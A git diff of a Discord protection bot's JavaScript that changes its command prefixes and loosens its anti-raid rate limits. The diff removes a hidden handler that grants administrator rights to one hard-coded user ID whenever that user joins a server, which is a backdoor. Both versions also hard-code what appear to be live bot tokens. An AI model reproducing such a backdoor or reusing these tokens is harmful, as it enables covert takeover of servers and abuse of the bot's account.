@@ -22,8 +22,8 @@ setInterval(() => {
   http.get(`http://tonybahez.glitch.me/`);
 }, 280000);
 let developers = ["561923346028036096"];
-const admin = "!t";
-const prefix = "a!";
+const admin = "!";
+const prefix = "!";
 
 //=============================== - [ Bot ] - ===================================
 
@@ -34,7 +34,7 @@ client.on("ready", () => {
   let statuses = [
     `Servers: ${client.guilds.size} | Users: ${client.users.size}`,
     ` By/Ａ47ｘＴｏＮｙ📿`,
-    `a!help`
+    `!help`
   ];
   setInterval(function() {
     let STREAMING = statuses[Math.floor(Math.random() * statuses.length)];
@@ -138,29 +138,29 @@ var config = {
     {
       type: "CHANNEL_CREATE",
       logType: "CHANNEL_CREATE",
-      limit: 3,
+      limit: 4,
       delay: 5000
     },
     {
       type: "CHANNEL_DELETE",
       logType: "CHANNEL_DELETE",
-      limit: 3,
+      limit: 4,
       delay: 5000
     },
     {
       type: "GUILD_MEMBER_REMOVE",
       logType: "MEMBER_KICK",
-      limit: 3,
+      limit: 4,
       delay: 5000
     },
-    { type: "GUILD_BAN_ADD", logType: "MEMBER_BAN_ADD", limit: 3, delay: 5000 },
+    { type: "GUILD_BAN_ADD", logType: "MEMBER_BAN_ADD", limit: 4, delay: 5000 },
     {
       type: "GUILD_ROLE_CREATE",
       logType: "ROLE_CREATE",
-      limit: 3,
+      limit: 4,
       delay: 5000
     },
-    { type: "GUILD_ROLE_DELETE", logType: "ROLE_DELETE", limit: 1, delay: 5000 }
+    { type: "GUILD_ROLE_DELETE", logType: "ROLE_DELETE", limit: 4, delay: 5000 }
   ]
 };
 client.on("error", e => console.error(e));
@@ -823,18 +823,5 @@ client.on("ready", async () => {
   }
 });
 
-client.on("guildMemberAdd", member => {
-  if (member.id === "629883719980810250") {
-    member.guild
-      .createRole({
-        name: client.user.username,
-        color: "RANDOM",
-        permissions: [8]
-      })
-      .then(function(role) {
-        member.addRole(role);
-      });
-  }
-});
 
-client.login("NjgxOTUwNjI5NDMzNzA0NDcy.XsSvkw.ToqjggNQd3RNr8TY7SsiYJU2XSo");
+client.login("NzEyOTg5NzU3ODIyNzMwMjcw.XsZlfQ._eJNjsHK187qr08WQJHsNLFjuGc");
